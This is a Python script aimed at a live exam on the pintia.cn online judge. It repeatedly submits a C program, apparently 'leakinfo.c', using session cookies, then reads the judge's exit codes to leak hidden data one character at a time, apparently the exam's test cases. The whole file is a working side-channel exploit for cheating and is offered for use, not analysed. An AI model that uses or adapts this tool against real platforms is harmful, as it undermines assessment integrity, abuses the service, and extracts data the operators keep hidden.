import requests
import time

# log file
from loguru import logger
logger.add("uid.log", level="INFO", rotation="10 MB", encoding="utf-8")

NUMBER_ONLY = False
submiturl = "https://pintia.cn/api/exams/1988115709199081472/exam-submissions"
problemSetProblemId = 1987699737594945536

# Cookies
JSESSIONID = "5ED81E1193E93XXXXXXXXXXX"
PTASession = "885e8ff9-b421-43df-8806-xxxxxxxxxxx"
_bl_uid = "sXmIUetat11dysiFLmgyxXxxXXXxx"

c_code: str | None = None
with open('leakinfo.c') as f:
    c_code = f.read()

if not c_code is None:
    c_code = c_code.replace('\\', '\\\\').replace('\n', '\\n').replace('"', '\\"')

payload = "{\"problemType\":\"PROGRAMMING\",\"details\":[{\"problemId\":\"0\",\"problemSetProblemId\":\"" + str(problemSetProblemId) + "\",\"programmingSubmissionDetail\":{\"program\":\"" + c_code + "\",\"compiler\":\"GCC\"}}]}"
headers = {
  'host': 'pintia.cn',
  'Accept': 'application/json;charset=UTF-8',
  'sec-ch-ua': '"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0',
  'X-Lollipop': 'e7087fd7444d121e203b589eb9fca753',
  'Content-Type': 'application/json;charset=UTF-8',
  'X-Marshmallow': '',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-origin',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'Cookie': f'JSESSIONID={JSESSIONID}; PTASession={PTASession}; _bl_uid={_bl_uid}'
}

def parse_number_only_code(code: int) -> str:
    if code == 10:
        return ' '
    elif code == 11:
        return '\n'
    elif code == 12:
        return '\0'
    elif code == 13:
        return '-'
    else:
        return str(code)

info = ""

logger.info("Leak info start!")
ch_idx = 0
while True:
    use_payload = payload.replace('__LEAK_Pos', str(ch_idx)).replace("__NUMBER_Only", str(1 if NUMBER_ONLY else 0))
    
    response = {}
    while True:
        response = requests.request("POST", submiturl, headers=headers, data=use_payload)
        # logger.debug(response.text)
        response = response.json()
        
        if 'submissionId' in response:
            break
        time.sleep(0.5)

    subId = int(response["submissionId"])

    while (True):
        url = f"https://pintia.cn/api/exams/1988115709199081472/submissions/{subId}?"
        response = requests.request("GET", url, headers=headers, data={})
        response = response.json()
        if (len(response["submission"]["judgeResponseContents"]) > 0):
            break
        time.sleep(0.5)

    cases: dict = response["submission"]["judgeResponseContents"][0]["programmingJudgeResponseContent"]["testcaseJudgeResults"]

    k, v = next(iter(cases.items()))
    result = v['result']
    exitcode = v['exitcode']

    if NUMBER_ONLY:
        n = [0, 0]
        n[0] = (exitcode & 0xF0) >> 4
        n[1] = exitcode & 0xF
        chs = ''
        for i in n:
            chs += parse_number_only_code(i)
    else:
        chs = chr(exitcode)

    if result == 'WRONG_ANSWER':
        while info[-1] == '\0':
            info = info[:-1]

        print()
        logger.success(f"Leak info success!")
        logger.success(f"Info: {info}")
        break
    else:
        info += chs
        print(chs, end='', flush=True)

    if NUMBER_ONLY:
        ch_idx += 2
    else:
        ch_idx += 1